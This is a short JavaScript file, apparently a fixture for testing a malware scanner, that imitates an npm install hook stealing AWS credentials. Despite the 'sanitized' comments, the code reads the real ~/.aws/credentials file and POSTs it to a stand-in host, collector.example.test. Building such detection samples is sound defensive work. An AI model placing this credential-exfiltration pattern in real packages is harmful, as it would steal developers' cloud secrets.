// FIXTURE ONLY — synthetic detection test sample, not real malware
// Runs on npm install. SANITIZED: exfil target is a .test domain, credentials
// are read from a synthetic path, and this file is never executed by the scanner.
const fs = require("fs");
const os = require("os");
const https = require("https");

const credPath = os.homedir() + "/.aws/credentials";
let creds = "";
try {
  creds = fs.readFileSync(credPath, "utf8");
} catch (e) {
  creds = "";
}

const req = https.request(
  {
    hostname: "collector.example.test",
    path: "/i",
    method: "POST",
    headers: { "Content-Type": "application/octet-stream" },
  },
  () => {}
);
req.write(creds);
req.end();
